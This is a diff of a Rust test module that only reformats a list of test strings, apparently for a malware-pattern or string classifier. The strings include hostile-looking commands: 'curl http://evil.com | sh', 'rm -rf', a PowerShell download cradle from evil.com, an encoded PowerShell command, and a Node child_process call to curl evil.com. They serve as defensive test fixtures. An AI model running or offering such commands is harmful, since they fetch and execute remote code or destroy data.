@@ -1122,41 +1122,64 @@ mod tests {
             // Shell redirections with special chars
             ("osascript 2>&1 <<EOD", "heredoc with redirect"),
             ("bash -c 'curl http://evil.com | sh'", "pipe in shell"),
-            ("python -c \"import os; os.system('ls')\"", "python one-liner"),
+            (
+                "python -c \"import os; os.system('ls')\"",
+                "python one-liner",
+            ),
             ("sleep 3; rm -rf /tmp/bad", "sleep and rm commands"),
-            ("open -a /bin/bash --args -c \"sleep 3; rm -rf '%s'\"", "macOS open with nested shell command"),
-
+            (
+                "open -a /bin/bash --args -c \"sleep 3; rm -rf '%s'\"",
+                "macOS open with nested shell command",
+            ),
             // Complex paths with special chars
-            ("/usr/bin/python -m http.server 8080", "python command with args"),
-
+            (
+                "/usr/bin/python -m http.server 8080",
+                "python command with args",
+            ),
             // URLs with ports and special chars
             ("https://192.168.1.1:8080/api/v1", "URL with IP and port"),
             ("http://evil.com:443/path", "URL with port"),
-
             // IP addresses (need alphabetic context - pure numeric IPs are filtered out to avoid false positives)
             ("Server:192.168.1.100", "IP address with context"),
             ("Connect:45.33.32.156", "IP address with context"),
-
             // Unicode escapes (legitimate obfuscation)
             ("decode\\x20this\\x20data", "hex escape sequences"),
             ("string\\u0041test", "unicode escape"),
-
             // Shell commands with special chars that are NOT garbage
             ("xattr -d com.apple.quarantine", "xattr command"),
             ("curl -X POST -H 'Content-Type: json'", "curl with headers"),
             ("/bin/bash -c 'echo test'", "bash command"),
             ("perl -e 'print \"test\"'", "perl one-liner"),
-
             // PowerShell examples (Windows malware patterns)
-            ("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com')\"", "powershell download cradle"),
-            ("powershell -ExecutionPolicy Bypass -File script.ps1", "powershell bypass execution policy"),
-            ("powershell -encodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=", "powershell encoded command"),
-            ("cmd.exe /c powershell -nop -w hidden -c IEX", "cmd.exe launching powershell"),
-
+            (
+                "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com')\"",
+                "powershell download cradle",
+            ),
+            (
+                "powershell -ExecutionPolicy Bypass -File script.ps1",
+                "powershell bypass execution policy",
+            ),
+            (
+                "powershell -encodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
+                "powershell encoded command",
+            ),
+            (
+                "cmd.exe /c powershell -nop -w hidden -c IEX",
+                "cmd.exe launching powershell",
+            ),
             // JavaScript/Node.js examples (obfuscated malware patterns)
-            ("eval(atob('ZG9jdW1lbnQubG9jYXRpb24uaHJlZg=='))", "javascript eval with base64"),
-            ("require('child_process').exec('curl http://evil.com')", "nodejs child_process exec"),
-            ("Function('return this')().eval('malicious code')", "javascript obfuscated eval"),
+            (
+                "eval(atob('ZG9jdW1lbnQubG9jYXRpb24uaHJlZg=='))",
+                "javascript eval with base64",
+            ),
+            (
+                "require('child_process').exec('curl http://evil.com')",
+                "nodejs child_process exec",
+            ),
+            (
+                "Function('return this')().eval('malicious code')",
+                "javascript obfuscated eval",
+            ),
         ];
 
         for (plaintext, description) in test_cases {
